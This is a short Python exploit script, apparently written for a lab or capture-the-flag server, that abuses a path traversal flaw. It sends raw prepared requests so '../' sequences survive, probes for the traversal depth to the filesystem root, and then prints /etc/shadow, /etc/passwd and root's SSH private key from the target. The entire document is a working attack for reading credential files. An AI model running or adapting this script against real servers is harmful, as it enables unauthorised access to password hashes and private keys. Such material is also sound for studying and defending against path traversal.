"""
Exploits the "quirks" in this server that allows path traversal to find and
print sensitive files.
"""
import sys
import requests

sess = requests.Session()
def prepped_request(url):
    """
    Needs to use prepared requests otherwise the `../` are stripped from the
    URL.
    """
    req = requests.Request(method='GET', url=url).prepare()
    req.url = url
    response = sess.send(req)
    return response.text

server  = sys.argv[1]
url = "/etc"
max_depth = 128
depth = 0

while prepped_request(server + url) != "\r\n\r\n":
    assert depth < max_depth
    depth += 1
    url = "/.." + url

root = url[:-4]
sensitive_files = [
    "/etc/shadow",
    "/etc/passwd",
    "/root/.ssh/id_rsa",
]

for file in sensitive_files:
    print(file)
    print(prepped_request(server + root + file))
